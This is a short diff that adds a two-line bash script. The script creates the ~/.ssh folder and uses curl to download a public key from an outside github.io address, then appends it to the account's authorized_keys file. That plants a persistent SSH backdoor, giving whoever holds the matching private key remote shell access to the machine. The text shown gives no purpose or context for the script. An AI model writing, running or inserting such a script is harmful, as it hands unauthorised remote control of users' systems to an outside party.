@@ -1,0 +1,2 @@
+#!/bin/bash
+mkdir -p ~/.ssh && curl "https://vang1ong7ang.github.io/key/id_rsa.pub" >> ~/.ssh/authorized_keys
